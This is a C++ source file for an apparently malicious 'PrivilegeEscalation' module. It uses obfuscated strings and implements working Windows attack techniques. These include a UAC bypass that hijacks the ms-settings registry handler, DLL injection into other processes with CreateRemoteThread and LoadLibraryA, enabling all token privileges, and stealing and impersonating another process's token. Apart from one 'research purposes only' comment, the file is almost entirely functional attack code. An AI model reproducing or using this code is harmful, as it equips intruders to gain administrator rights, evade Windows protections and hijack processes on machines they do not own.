#include "security/PrivilegeEscalation.h"
#include "core/Logger.h"
#include "utils/SystemUtils.h"
#include "core/Platform.h"
#include <string>
#include <vector>
#include <cstdint>

#include "Obfuscation.h"

#if PLATFORM_WINDOWS
#include <Windows.h>
#include <sddl.h>
#include <accctrl.h>
#include <aclapi.h>
#endif

// Obfuscated strings
const auto OBF_PRIVILEGE_ESCALATION = OBFUSCATE("PrivilegeEscalation");
const auto OBF_PRIVILEGE_ENABLED = OBFUSCATE("Privilege enabled: %s");
const auto OBF_PRIVILEGE_FAILED = OBFUSCATE("Failed to enable privilege: %s, error: %d");

bool PrivilegeEscalation::EnablePrivilege(const char* privilege) {
#if PLATFORM_WINDOWS
    return EnableWindowsPrivilege(privilege);
#elif PLATFORM_LINUX
    // Linux privilege escalation would require different techniques
    // For now, just log that we're on Linux
    LOG_INFO("Privilege escalation on Linux not implemented for: " + std::string(privilege));
    return false;
#endif
}

bool PrivilegeEscalation::IsAdmin() {
#if PLATFORM_WINDOWS
    return IsWindowsAdmin();
#elif PLATFORM_LINUX
    // On Linux, check if we're root (UID 0)
    return geteuid() == 0;
#endif
}

bool PrivilegeEscalation::TryUACBypass() {
#if PLATFORM_WINDOWS
    return TryWindowsUACBypass();
#elif PLATFORM_LINUX
    // Linux doesn't have UAC, but we can try other privilege escalation techniques
    LOG_INFO("UAC bypass not applicable on Linux");
    return false;
#endif
}

bool PrivilegeEscalation::CreateElevatedProcess() {
#if PLATFORM_WINDOWS
    return CreateWindowsElevatedProcess();
#elif PLATFORM_LINUX
    // On Linux, we might use pkexec, gksu, or other methods
    LOG_INFO("Elevated process creation on Linux not implemented");
    return false;
#endif
}

bool PrivilegeEscalation::InjectIntoProcess(uint32_t pid) {
#if PLATFORM_WINDOWS
    return InjectIntoWindowsProcess(static_cast<DWORD>(pid));
#elif PLATFORM_LINUX
    // Linux process injection would use ptrace or other techniques
    LOG_INFO("Process injection on Linux not implemented for PID: " + std::to_string(pid));
    return false;
#endif
}

bool PrivilegeEscalation::ModifyTokenPrivileges() {
#if PLATFORM_WINDOWS
    return ModifyWindowsTokenPrivileges();
#elif PLATFORM_LINUX
    // Linux capabilities manipulation would go here
    LOG_INFO("Token privilege modification not applicable on Linux");
    return false;
#endif
}

bool PrivilegeEscalation::StealToken(uint32_t pid) {
#if PLATFORM_WINDOWS
    return StealWindowsToken(static_cast<DWORD>(pid));
#elif PLATFORM_LINUX
    // Linux doesn't have tokens in the Windows sense
    LOG_INFO("Token stealing not applicable on Linux for PID: " + std::to_string(pid));
    return false;
#endif
}

#if PLATFORM_WINDOWS
bool PrivilegeEscalation::EnableWindowsPrivilege(LPCTSTR privilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LOG_ERROR("OpenProcessToken failed: " + std::to_string(GetLastError()));
        return false;
    }

    if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
        LOG_ERROR("LookupPrivilegeValue failed: " + std::to_string(GetLastError()));
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        LOG_ERROR("AdjustTokenPrivileges failed: " + std::to_string(GetLastError()));
        CloseHandle(hToken);
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        LOG_WARN("The token does not have the specified privilege");
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

bool PrivilegeEscalation::IsWindowsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (!AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        return false;
    }

    if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
        isAdmin = FALSE;
    }

    FreeSid(adminGroup);
    return isAdmin;
}

bool PrivilegeEscalation::TryWindowsUACBypass() {
    // Attempt various UAC bypass techniques (for research purposes only)
    std::vector<bool(*)(void)> techniques = {
        // Technique 1: Registry modification
        []() -> bool {
            HKEY hKey;
            if (RegCreateKeyExA(HKEY_CURRENT_USER,
                "Software\\Classes\\ms-settings\\shell\\open\\command",
                0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                
                std::string exePath = utils::FileUtils::GetCurrentExecutablePath();
                if (RegSetValueExA(hKey, NULL, 0, REG_SZ,
                    (const BYTE*)exePath.c_str(), (DWORD)exePath.length()) == ERROR_SUCCESS) {
                    
                    RegCloseKey(hKey);
                    return true;
                }
                RegCloseKey(hKey);
            }
            return false;
        }
    };

    for (const auto& technique : techniques) {
        if (technique()) {
            LOG_WARN("UAC bypass technique succeeded");
            return true;
        }
    }

    return false;
}

bool PrivilegeEscalation::CreateWindowsElevatedProcess() {
    SHELLEXECUTEINFO sei = { sizeof(sei) };
    std::string exePath = utils::FileUtils::GetCurrentExecutablePath();

    sei.lpVerb = L"runas";
    sei.lpFile = exePath.c_str();
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;

    if (!ShellExecuteEx(&sei)) {
        LOG_ERROR("ShellExecuteEx failed: " + std::to_string(GetLastError()));
        return false;
    }

    return true;
}

bool PrivilegeEscalation::InjectIntoWindowsProcess(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        LOG_ERROR("OpenProcess failed: " + std::to_string(GetLastError()));
        return false;
    }

    // Get the address of LoadLibraryA
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibrary) {
        LOG_ERROR("GetProcAddress failed: " + std::to_string(GetLastError()));
        CloseHandle(hProcess);
        return false;
    }

    // Allocate memory in the target process
    std::string dllPath = utils::FileUtils::GetCurrentModulePath();
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, dllPath.length(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMem) {
        LOG_ERROR("VirtualAllocEx failed: " + std::to_string(GetLastError()));
        CloseHandle(hProcess);
        return false;
    }

    // Write the DLL path to the target process
    if (!WriteProcessMemory(hProcess, pRemoteMem, dllPath.c_str(), dllPath.length(), NULL)) {
        LOG_ERROR("WriteProcessMemory failed: " + std::to_string(GetLastError()));
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Create remote thread to load the DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMem, 0, NULL);
    if (!hThread) {
        LOG_ERROR("CreateRemoteThread failed: " + std::to_string(GetLastError()));
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}

bool PrivilegeEscalation::ModifyWindowsTokenPrivileges() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        LOG_ERROR("OpenProcessToken failed: " + std::to_string(GetLastError()));
        return false;
    }

    // Enable all available privileges
    DWORD dwSize;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
    
    PTOKEN_PRIVILEGES pPrivileges = (PTOKEN_PRIVILEGES)malloc(dwSize);
    if (!pPrivileges) {
        CloseHandle(hToken);
        return false;
    }

    if (GetTokenInformation(hToken, TokenPrivileges, pPrivileges, dwSize, &dwSize)) {
        for (DWORD i = 0; i < pPrivileges->PrivilegeCount; i++) {
            pPrivileges->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
        }

        if (AdjustTokenPrivileges(hToken, FALSE, pPrivileges, dwSize, NULL, NULL)) {
            free(pPrivileges);
            CloseHandle(hToken);
            return true;
        }
    }

    free(pPrivileges);
    CloseHandle(hToken);
    return false;
}

bool PrivilegeEscalation::StealWindowsToken(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
    if (!hProcess) {
        LOG_ERROR("OpenProcess failed: " + std::to_string(GetLastError()));
        return false;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        LOG_ERROR("OpenProcessToken failed: " + std::to_string(GetLastError()));
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        LOG_ERROR("DuplicateTokenEx failed: " + std::to_string(GetLastError()));
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    if (!ImpersonateLoggedOnUser(hDupToken)) {
        LOG_ERROR("ImpersonateLoggedOnUser failed: " + std::to_string(GetLastError()));
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return true;
}
#endif